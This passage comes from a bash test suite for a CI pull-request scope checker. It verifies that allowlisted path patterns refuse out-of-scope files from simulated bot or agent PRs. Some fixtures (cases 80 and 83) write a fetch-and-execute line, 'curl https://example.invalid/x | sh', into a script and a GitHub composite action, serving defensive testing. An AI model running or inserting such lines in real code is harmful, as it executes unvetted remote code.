printf '[package]\nname="pol-fuzz"\nversion="0.0.0"\npublish=false\n\n[dependencies]\nlibfuzzer-sys="0.4"\n' > "$D77/crates/pol/fuzz/Cargo.toml"
commit_all "$D77" base
git -C "$D77" checkout -qb pr
printf 'arbitrary content, never named Cargo.toml, never reaches the capability check\n' > "$D77/crates/pol/fuzz/build.toml"
commit_all "$D77" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.toml, filename token): crates/pol/fuzz/build.toml must be refused =="
OUT77="$(run_scope "$D77")" && RC77=0 || RC77=$?
if [ "$RC77" -eq 0 ]; then
  echo "FAIL: case 77 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT77" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT77" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: crates/pol/fuzz/build.toml was reported EXEMPT. Got:"
  echo "$OUT77" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT77" | grep -qF 'crates/pol/fuzz/build.toml'; then
  echo "FAIL: refused, but crates/pol/fuzz/build.toml was not named among the offending paths. Got:"
  echo "$OUT77" | sed 's/^/    /'
  FAILED=1
else
  note "a non-Cargo.toml file inside a fuzz dir is refused (pins the filename token; a mutant here bypasses the content check entirely, not merely scope)"
fi

# ---------------------------------------------------------------------------
# 78. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.lock, "fuzz" directory
#     token. A lockfile's content is NEVER checked by anything in this
#     script (manifest_disallowed_diff only ever runs over a path ending in
#     Cargo.toml), so every widening of this alternative is a full content
#     bypass, not merely a scope widening.
# ---------------------------------------------------------------------------
D78="$WORK/bot-allowed-a5-fuzzdir-token"
new_repo "$D78"
mkdir -p "$D78/crates/pol/notfuzz"
printf 'placeholder\n' > "$D78/README.md"
commit_all "$D78" base
git -C "$D78" checkout -qb pr
printf 'attacker-controlled content, no sibling manifest ties it to anything reviewed\n' > "$D78/crates/pol/notfuzz/Cargo.lock"
commit_all "$D78" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.lock, fuzz-dir token): crates/pol/notfuzz/Cargo.lock must be refused =="
OUT78="$(run_scope "$D78")" && RC78=0 || RC78=$?
if [ "$RC78" -eq 0 ]; then
  echo "FAIL: case 78 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT78" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT78" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: crates/pol/notfuzz/Cargo.lock was reported EXEMPT. Got:"
  echo "$OUT78" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT78" | grep -qF 'crates/pol/notfuzz/Cargo.lock'; then
  echo "FAIL: refused, but crates/pol/notfuzz/Cargo.lock was not named among the offending paths. Got:"
  echo "$OUT78" | sed 's/^/    /'
  FAILED=1
else
  note "an arbitrary-content lockfile under a non-fuzz second-level directory is refused (pins the fuzz-dir token)"
fi

# ---------------------------------------------------------------------------
# 79. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.lock, leading directory
#     token. Same shape as 76, for the never-content-checked lockfile.
# ---------------------------------------------------------------------------
D79="$WORK/bot-allowed-a5-dir-token"
new_repo "$D79"
mkdir -p "$D79/vendor/pol/fuzz"
printf 'placeholder\n' > "$D79/README.md"
commit_all "$D79" base
git -C "$D79" checkout -qb pr
printf 'attacker-controlled content, no sibling manifest ties it to anything reviewed\n' > "$D79/vendor/pol/fuzz/Cargo.lock"
commit_all "$D79" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.lock, dir token): vendor/pol/fuzz/Cargo.lock must be refused =="
OUT79="$(run_scope "$D79")" && RC79=0 || RC79=$?
if [ "$RC79" -eq 0 ]; then
  echo "FAIL: case 79 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT79" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT79" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: vendor/pol/fuzz/Cargo.lock was reported EXEMPT. Got:"
  echo "$OUT79" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT79" | grep -qF 'vendor/pol/fuzz/Cargo.lock'; then
  echo "FAIL: refused, but vendor/pol/fuzz/Cargo.lock was not named among the offending paths. Got:"
  echo "$OUT79" | sed 's/^/    /'
  FAILED=1
else
  note "an arbitrary-content lockfile under a non-crates top directory is refused (pins the leading dir token)"
fi

# ---------------------------------------------------------------------------
# 80. BOT_ALLOWED sweep, crates/[^/]+/fuzz/Cargo\.lock, filename/extension
#     token. Widening the trailing `Cargo\.lock` to `.+` admits ANY file
#     inside a fuzz directory, content never checked by anything in this
#     script: the fullest possible bypass this alternative can grant.
# ---------------------------------------------------------------------------
D80="$WORK/bot-allowed-a5-filename-token"
new_repo "$D80"
mkdir -p "$D80/crates/pol/fuzz"
printf 'placeholder\n' > "$D80/README.md"
commit_all "$D80" base
git -C "$D80" checkout -qb pr
printf '#!/bin/sh\ncurl https://example.invalid/x | sh\n' > "$D80/crates/pol/fuzz/payload.sh"
commit_all "$D80" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (fuzz/Cargo\\.lock, filename token): crates/pol/fuzz/payload.sh must be refused =="
OUT80="$(run_scope "$D80")" && RC80=0 || RC80=$?
if [ "$RC80" -eq 0 ]; then
  echo "FAIL: case 80 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT80" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT80" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: crates/pol/fuzz/payload.sh was reported EXEMPT. Got:"
  echo "$OUT80" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT80" | grep -qF 'crates/pol/fuzz/payload.sh'; then
  echo "FAIL: refused, but crates/pol/fuzz/payload.sh was not named among the offending paths. Got:"
  echo "$OUT80" | sed 's/^/    /'
  FAILED=1
else
  note "an arbitrary file inside a fuzz dir, not shaped like Cargo.lock at all, is refused (pins the filename/extension token)"
fi

# ---------------------------------------------------------------------------
# 81. BOT_ALLOWED sweep, \.github/workflows/[^/]+\.ya?ml, extension token
#     (round seven's D05, re-verified). Widening `\.ya?ml` to `\..*` admits
#     any file inside .github/workflows, not only a YAML workflow.
# ---------------------------------------------------------------------------
D81="$WORK/bot-allowed-a6-ext-token"
new_repo "$D81"
mkdir -p "$D81/.github/workflows"
printf 'placeholder\n' > "$D81/README.md"
commit_all "$D81" base
git -C "$D81" checkout -qb pr
printf '#!/bin/sh\necho attacker-controlled\n' > "$D81/.github/workflows/helper.sh"
commit_all "$D81" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (.github/workflows, extension token): .github/workflows/helper.sh must be refused =="
OUT81="$(run_scope "$D81")" && RC81=0 || RC81=$?
if [ "$RC81" -eq 0 ]; then
  echo "FAIL: case 81 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT81" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT81" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: .github/workflows/helper.sh was reported EXEMPT. Got:"
  echo "$OUT81" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT81" | grep -qF '.github/workflows/helper.sh'; then
  echo "FAIL: refused, but .github/workflows/helper.sh was not named among the offending paths. Got:"
  echo "$OUT81" | sed 's/^/    /'
  FAILED=1
else
  note "a non-YAML file inside .github/workflows is refused (pins the extension token)"
fi

# ---------------------------------------------------------------------------
# 82. BOT_ALLOWED sweep, \.github/workflows/[^/]+\.ya?ml, filename/depth
#     token (round seven's D03, re-verified). Widening `[^/]+\.ya?ml` to
#     `.+` lets the single-component boundary be crossed: a nested
#     subdirectory under workflows/ must still be refused.
# ---------------------------------------------------------------------------
D82="$WORK/bot-allowed-a6-depth-token"
new_repo "$D82"
mkdir -p "$D82/.github/workflows"
printf 'placeholder\n' > "$D82/README.md"
commit_all "$D82" base
git -C "$D82" checkout -qb pr
mkdir -p "$D82/.github/workflows/nested"
printf 'name: deploy\non: push\njobs: {}\n' > "$D82/.github/workflows/nested/deploy.yml"
commit_all "$D82" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (.github/workflows, depth token): .github/workflows/nested/deploy.yml must be refused =="
OUT82="$(run_scope "$D82")" && RC82=0 || RC82=$?
if [ "$RC82" -eq 0 ]; then
  echo "FAIL: case 82 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT82" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT82" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: .github/workflows/nested/deploy.yml was reported EXEMPT. Got:"
  echo "$OUT82" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT82" | grep -qF '.github/workflows/nested/deploy.yml'; then
  echo "FAIL: refused, but .github/workflows/nested/deploy.yml was not named among the offending paths. Got:"
  echo "$OUT82" | sed 's/^/    /'
  FAILED=1
else
  note "a YAML file nested under a subdirectory of .github/workflows is refused (pins the single-component boundary)"
fi

# ---------------------------------------------------------------------------
# 83. BOT_ALLOWED sweep, \.github/workflows/[^/]+\.ya?ml, "workflows"
#     directory token (round seven's B13, re-verified). Widening (or
#     dropping) the literal `workflows` component admits a YAML file
#     anywhere under .github, not only inside the workflows directory.
# ---------------------------------------------------------------------------
D83="$WORK/bot-allowed-a6-dir-token"
new_repo "$D83"
mkdir -p "$D83/.github"
printf 'placeholder\n' > "$D83/README.md"
commit_all "$D83" base
git -C "$D83" checkout -qb pr
mkdir -p "$D83/.github/actions/setup"
printf 'name: setup\nruns:\n  using: composite\n  steps:\n    - run: curl https://example.invalid/x | sh\n' > "$D83/.github/actions/setup/action.yml"
commit_all "$D83" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (.github/workflows, dir token): .github/actions/setup/action.yml must be refused =="
OUT83="$(run_scope "$D83")" && RC83=0 || RC83=$?
if [ "$RC83" -eq 0 ]; then
  echo "FAIL: case 83 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT83" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT83" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: .github/actions/setup/action.yml was reported EXEMPT. Got:"
  echo "$OUT83" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT83" | grep -qF '.github/actions/setup/action.yml'; then
  echo "FAIL: refused, but .github/actions/setup/action.yml was not named among the offending paths. Got:"
  echo "$OUT83" | sed 's/^/    /'
  FAILED=1
else
  note "a YAML file under .github but outside workflows/ is refused (pins the workflows-dir token)"
fi

# ---------------------------------------------------------------------------
# 84. BOT_ALLOWED sweep, \.github/dependabot\.yml, name token (round seven's
#     D02, re-verified). Widening the literal `dependabot` component to
#     `[^/]+` admits any YAML file directly under .github.
# ---------------------------------------------------------------------------
D84="$WORK/bot-allowed-a7-name-token"
new_repo "$D84"
mkdir -p "$D84/.github"
printf 'placeholder\n' > "$D84/README.md"
commit_all "$D84" base
git -C "$D84" checkout -qb pr
printf 'not dependabot config\n' > "$D84/.github/other.yml"
commit_all "$D84" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (.github/dependabot.yml, name token): .github/other.yml must be refused =="
OUT84="$(run_scope "$D84")" && RC84=0 || RC84=$?
if [ "$RC84" -eq 0 ]; then
  echo "FAIL: case 84 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT84" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT84" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: .github/other.yml was reported EXEMPT. Got:"
  echo "$OUT84" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT84" | grep -qF '.github/other.yml'; then
  echo "FAIL: refused, but .github/other.yml was not named among the offending paths. Got:"
  echo "$OUT84" | sed 's/^/    /'
  FAILED=1
else
  note "a YAML file directly under .github that is not literally dependabot.yml is refused (pins the name token)"
fi

# ---------------------------------------------------------------------------
# 85. BOT_ALLOWED sweep, \.github/dependabot\.yml, extension token. Unlike
#     the workflows alternative this one has no `ya?ml` alternation at all,
#     just a fixed literal extension; widening it to `\..*` admits any file
#     literally named "dependabot" under .github, whatever its extension.
# ---------------------------------------------------------------------------
D85="$WORK/bot-allowed-a7-ext-token"
new_repo "$D85"
mkdir -p "$D85/.github"
printf 'placeholder\n' > "$D85/README.md"
commit_all "$D85" base
git -C "$D85" checkout -qb pr
printf '#!/bin/sh\necho attacker-controlled\n' > "$D85/.github/dependabot.sh"
commit_all "$D85" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (.github/dependabot.yml, extension token): .github/dependabot.sh must be refused =="
OUT85="$(run_scope "$D85")" && RC85=0 || RC85=$?
if [ "$RC85" -eq 0 ]; then
  echo "FAIL: case 85 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT85" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT85" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: .github/dependabot.sh was reported EXEMPT. Got:"
  echo "$OUT85" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT85" | grep -qF '.github/dependabot.sh'; then
  echo "FAIL: refused, but .github/dependabot.sh was not named among the offending paths. Got:"
  echo "$OUT85" | sed 's/^/    /'
  FAILED=1
else
  note "a file named dependabot but not ending in .yml is refused (pins the extension token)"
fi

# ---------------------------------------------------------------------------
# 86. BOT_ALLOWED sweep, packages/[^/]+/package(-lock)?\.json, filename
#     token. Widening the literal `package(-lock)?` component to `[^/]+`
#     admits any JSON file inside a package directory.
# ---------------------------------------------------------------------------
D86="$WORK/bot-allowed-a8-filename-token"
new_repo "$D86"
mkdir -p "$D86/packages/dashboard"
printf 'placeholder\n' > "$D86/README.md"
commit_all "$D86" base
git -C "$D86" checkout -qb pr
printf '{"not":"package.json"}\n' > "$D86/packages/dashboard/malicious.json"
commit_all "$D86" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (packages/.../package.json, filename token): packages/dashboard/malicious.json must be refused =="
OUT86="$(run_scope "$D86")" && RC86=0 || RC86=$?
if [ "$RC86" -eq 0 ]; then
  echo "FAIL: case 86 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT86" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT86" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: packages/dashboard/malicious.json was reported EXEMPT. Got:"
  echo "$OUT86" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT86" | grep -qF 'packages/dashboard/malicious.json'; then
  echo "FAIL: refused, but packages/dashboard/malicious.json was not named among the offending paths. Got:"
  echo "$OUT86" | sed 's/^/    /'
  FAILED=1
else
  note "a JSON file inside a package dir that is not literally package(-lock).json is refused (pins the filename token)"
fi

# ---------------------------------------------------------------------------
# 87. BOT_ALLOWED sweep, packages/[^/]+/package(-lock)?\.json, leading
#     directory token. Widening the literal `packages` component to
#     `[^/]+` admits a package.json under any top-level directory.
# ---------------------------------------------------------------------------
D87="$WORK/bot-allowed-a8-dir-token"
new_repo "$D87"
mkdir -p "$D87/vendor/dashboard"
printf 'placeholder\n' > "$D87/README.md"
commit_all "$D87" base
git -C "$D87" checkout -qb pr
printf '{"name":"dashboard","version":"0.1.0"}\n' > "$D87/vendor/dashboard/package.json"
commit_all "$D87" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (packages/.../package.json, dir token): vendor/dashboard/package.json must be refused =="
OUT87="$(run_scope "$D87")" && RC87=0 || RC87=$?
if [ "$RC87" -eq 0 ]; then
  echo "FAIL: case 87 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT87" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT87" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: vendor/dashboard/package.json was reported EXEMPT. Got:"
  echo "$OUT87" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT87" | grep -qF 'vendor/dashboard/package.json'; then
  echo "FAIL: refused, but vendor/dashboard/package.json was not named among the offending paths. Got:"
  echo "$OUT87" | sed 's/^/    /'
  FAILED=1
else
  note "a package.json under a non-packages top directory is refused (pins the leading dir token)"
fi

# ---------------------------------------------------------------------------
# 88. BOT_ALLOWED sweep, packages/[^/]+/package(-lock)?\.json, depth token.
#     Widening the `[^/]+` package-name component to `.+` would let a
#     package.json under a nested subdirectory ride the alternative.
# ---------------------------------------------------------------------------
D88="$WORK/bot-allowed-a8-depth-token"
new_repo "$D88"
mkdir -p "$D88/packages/dashboard"
printf 'placeholder\n' > "$D88/README.md"
commit_all "$D88" base
git -C "$D88" checkout -qb pr
mkdir -p "$D88/packages/dashboard/nested"
printf '{"name":"nested","version":"0.1.0"}\n' > "$D88/packages/dashboard/nested/package.json"
commit_all "$D88" attack
fake_gh 'dependabot[bot]' ''
echo "== BOT_ALLOWED sweep (packages/.../package.json, depth token): packages/dashboard/nested/package.json must be refused =="
OUT88="$(run_scope "$D88")" && RC88=0 || RC88=$?
if [ "$RC88" -eq 0 ]; then
  echo "FAIL: case 88 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT88" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT88" | grep -qF 'pr-scope-check: EXEMPT'; then
  echo "FAIL: packages/dashboard/nested/package.json was reported EXEMPT. Got:"
  echo "$OUT88" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT88" | grep -qF 'packages/dashboard/nested/package.json'; then
  echo "FAIL: refused, but packages/dashboard/nested/package.json was not named among the offending paths. Got:"
  echo "$OUT88" | sed 's/^/    /'
  FAILED=1
else
  note "a package.json nested a level deeper than the allowlisted single component is refused (pins the depth token)"
fi

# ===========================================================================
# SHOULD_FIX findings from round seven, addressed directly rather than
# deferred.
# ---------------------------------------------------------------------------

# ---------------------------------------------------------------------------
# 89. SHOULD_FIX: the three-dot merge-base rule (line 115-137's own 23 lines
#     of prose, issue #535) is the most heavily documented rule in the
#     script and had no case pinning that MERGE_BASE, not BASE_SHA, is what
#     the diff is actually computed against. `main` advances with an
#     unrelated commit AFTER this PR branched; BASE_SHA is passed as that
#     NEW tip (the real workflow always passes the current base branch
#     head, not the commit this PR's branch point). A two-dot diff against
#     BASE_SHA directly would show main's own later, unrelated file as
#     "changed" by this PR (removed, from the PR's point of view) and blame
#     it on this PR, reproducing the exact PR #512 incident the comment
#     names.
# ---------------------------------------------------------------------------
D89="$WORK/mergebase-not-basesha-should-fix"
new_repo "$D89"
mkdir -p "$D89/src"
printf 'orig\n' > "$D89/src/a.rs"
printf '# Changelog\n' > "$D89/CHANGELOG.md"
commit_all "$D89" base
git -C "$D89" checkout -qb pr
printf 'changed\n' > "$D89/src/a.rs"
commit_all "$D89" implement
HEAD89="$(git -C "$D89" rev-parse HEAD)"
git -C "$D89" checkout -q main
printf 'unrelated content, landed by a DIFFERENT pull request after this branch diverged\n' > "$D89/src/other_pr_landed.rs"
commit_all "$D89" "unrelated PR merged into main"
BASE89="$(git -C "$D89" rev-parse main)"
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `src/a.rs` | modify | the only file this PR touches |
'
echo "== the three-dot merge-base rule: BASE_SHA must not be diffed against directly once main has advanced =="
OUT89="$(run_scope "$D89" "$BASE89" "$HEAD89")" && RC89=0 || RC89=$?
if [ "$RC89" -ne 0 ]; then
  echo "FAIL: case 89 was expected to pass (rc=0) but exited non-zero (rc=$RC89). If this fails, the" >&2
  echo "diff was likely computed against BASE_SHA directly (a two-dot diff) instead of the merge" >&2
  echo "base, and main's own later, unrelated commit is being blamed on this PR (issue #535's" >&2
  echo "exact incident, and the real PR #512 it names). Got:" >&2
  echo "$OUT89" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT89" | grep -qF 'pr-scope-check: the diff matches issue #42'; then
  note "the diff is computed against the merge base, not BASE_SHA directly; main's later unrelated commit is not blamed on this PR"
else
  echo "FAIL: a PR whose only real change is declared was refused, most likely because the diff" >&2
  echo "was computed against BASE_SHA instead of the merge base. Got:" >&2
  echo "$OUT89" | sed 's/^/    /' >&2
  FAILED=1
fi

# ---------------------------------------------------------------------------
# 90. SHOULD_FIX: the Files-table parser's heading-exactness rule. The issue
#     body contains a SECOND section, `## Do not touch these files`, whose
#     own markdown table backticks a path in its first cell. That heading
#     does not start with "## files" and must not turn its table into
#     declared scope; a widened `"files" in s.lower()` match would.
# ---------------------------------------------------------------------------
D90="$WORK/files-heading-exactness-should-fix"
new_repo "$D90"
mkdir -p "$D90/src"
printf 'orig\n' > "$D90/src/a.rs"
printf 'orig secret\n' > "$D90/src/secrets.rs"
commit_all "$D90" base
git -C "$D90" checkout -qb pr
printf 'changed\n' > "$D90/src/a.rs"
printf 'changed secret\n' > "$D90/src/secrets.rs"
commit_all "$D90" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `src/a.rs` | modify | the only file this PR should touch |

## Do not touch these files

| Path | Reason |
| --- | --- |
| `src/secrets.rs` | out of scope, never edit this file |
'
echo "== Files-table heading exactness: a 'Do not touch these files' table must never be read as declared scope =="
OUT90="$(run_scope "$D90")" && RC90=0 || RC90=$?
if [ "$RC90" -eq 0 ]; then
  echo "FAIL: case 90 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT90" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT90" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: src/secrets.rs, listed only under a 'Do not touch' heading, was treated as declared. Got:"
  echo "$OUT90" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT90" | grep -qF 'src/secrets.rs'; then
  echo "FAIL: refused, but src/secrets.rs was not named among the undeclared paths. Got:"
  echo "$OUT90" | sed 's/^/    /'
  FAILED=1
else
  note "a 'Do not touch these files' section's own table is never read as declared scope"
fi

# ---------------------------------------------------------------------------
# 91. SHOULD_FIX: the Files-table parser's table-row restriction
#     (`not s.startswith("|")`). A backticked path sitting in a PROSE
#     sentence under `## Files`, not inside a table row, must not be read
#     as a declared path either.
# ---------------------------------------------------------------------------
D91="$WORK/files-row-restriction-should-fix"
new_repo "$D91"
mkdir -p "$D91/src"
printf 'orig\n' > "$D91/src/a.rs"
printf 'orig secret\n' > "$D91/src/secrets.rs"
commit_all "$D91" base
git -C "$D91" checkout -qb pr
printf 'changed\n' > "$D91/src/a.rs"
printf 'changed secret\n' > "$D91/src/secrets.rs"
commit_all "$D91" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

Do NOT touch `src/secrets.rs` under any circumstances.

| Path | Action | Purpose |
| --- | --- | --- |
| `src/a.rs` | modify | the only file this PR should touch |
'
echo "== Files-table row restriction: a backticked path in PROSE under ## Files must not be read as a declared row =="
OUT91="$(run_scope "$D91")" && RC91=0 || RC91=$?
if [ "$RC91" -eq 0 ]; then
  echo "FAIL: case 91 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT91" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT91" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: src/secrets.rs, named only in a prose warning sentence, was treated as declared. Got:"
  echo "$OUT91" | sed 's/^/    /'
  FAILED=1
elif ! echo "$OUT91" | grep -qF 'src/secrets.rs'; then
  echo "FAIL: refused, but src/secrets.rs was not named among the undeclared paths. Got:"
  echo "$OUT91" | sed 's/^/    /'
  FAILED=1
else
  note "a backticked path in prose under ## Files is never read as a declared table row"
fi

# ---------------------------------------------------------------------------
# 92. SHOULD_FIX: the Files-table parser's header/separator skip
#     (`path.lower() == "path" or set(path) <= set("-: ")`). A malformed but
#     plausible table backticks its own header cell (`` | `Path` | Action
#     | ``); that must still be skipped, not read as declaring a file
#     literally named "Path".
# ---------------------------------------------------------------------------
D92="$WORK/files-header-skip-should-fix"
new_repo "$D92"
mkdir -p "$D92/src"
printf 'orig\n' > "$D92/src/a.rs"
commit_all "$D92" base
git -C "$D92" checkout -qb pr
printf 'changed\n' > "$D92/src/a.rs"
printf 'a real, tracked file literally named Path, not a header row\n' > "$D92/Path"
commit_all "$D92" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| `Path` | Action | Purpose |
| --- | --- | --- |
| `src/a.rs` | modify | the only real declared file |
'
echo "== Files-table header skip: a backticked table header must not declare a file literally named Path =="
OUT92="$(run_scope "$D92")" && RC92=0 || RC92=$?
if [ "$RC92" -eq 0 ]; then
  echo "FAIL: case 92 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT92" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT92" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: a file literally named 'Path' was treated as declared by the table's own (backticked)" >&2
  echo "header row. Got:" >&2
  echo "$OUT92" | sed 's/^/    /' >&2
  FAILED=1
elif ! echo "$OUT92" | grep -qE '^ {4}Path$'; then
  echo "FAIL: refused, but the file named 'Path' was not clearly named among the undeclared paths. Got:"
  echo "$OUT92" | sed 's/^/    /'
  FAILED=1
else
  note "a backticked table header ('Path') is skipped, not read as declaring a file literally named Path"
fi

# ---------------------------------------------------------------------------
# 93. SHOULD_FIX: the root-vs-nested lockfile exemption boundary
#     (`[ "$f" = "Cargo.lock" ]`, line 804, deliberately an EXACT match on
#     the ROOT lockfile only). A DIFFERENT crate's declared, changed
#     manifest sets cargo_lock_exempt=1; an UNRELATED crate's nested
#     Cargo.lock, whose own sibling manifest is neither declared nor
#     touched, must not ride that flag. This is the non-bot path's own
#     cargo_lock_exempt loop (lines 784-798), independent of BOT_ALLOWED.
# ---------------------------------------------------------------------------
D93="$WORK/nested-lockfile-boundary-should-fix"
new_repo "$D93"
mkdir -p "$D93/crates/a" "$D93/crates/b/fuzz"
printf '[package]\nname="a"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.0"\n' > "$D93/crates/a/Cargo.toml"
printf '[package]\nname="b-fuzz"\nversion="0.0.0"\npublish=false\n\n[dependencies]\nlibfuzzer-sys="0.4"\n' > "$D93/crates/b/fuzz/Cargo.toml"
printf 'placeholder\n' > "$D93/crates/b/fuzz/Cargo.lock"
commit_all "$D93" base
git -C "$D93" checkout -qb pr
printf '[package]\nname="a"\nversion="0.1.0"\n\n[dependencies]\nserde = "1.1"\n' > "$D93/crates/a/Cargo.toml"
printf 'attacker-controlled content, no declared sibling ties it to anything reviewed\n' > "$D93/crates/b/fuzz/Cargo.lock"
commit_all "$D93" implement
fake_gh 'coder-agent' 'Closes #42' '## Files

| Path | Action | Purpose |
| --- | --- | --- |
| `crates/a/Cargo.toml` | modify | bump serde in crate a, unrelated to crate b |
'
echo "== nested lockfile exemption boundary: an unrelated crate's nested Cargo.lock must not ride a DIFFERENT crate's declared bump =="
OUT93="$(run_scope "$D93")" && RC93=0 || RC93=$?
if [ "$RC93" -eq 0 ]; then
  echo "FAIL: case 93 was expected to be refused (non-zero exit) but exited 0. A refusal-shaped" >&2
  echo "message with rc=0 is exactly the branch-protection bypass this suite exists to catch" >&2
  echo "(round six's own finding). Got:" >&2
  echo "$OUT93" | sed 's/^/    /' >&2
  FAILED=1
fi
if echo "$OUT93" | grep -qF 'pr-scope-check: the diff matches issue'; then
  echo "FAIL: crates/b/fuzz/Cargo.lock, whose own sibling manifest is neither declared nor touched," >&2
  echo "rode crate a's unrelated declared bump. Got:" >&2
  echo "$OUT93" | sed 's/^/    /' >&2
  FAILED=1
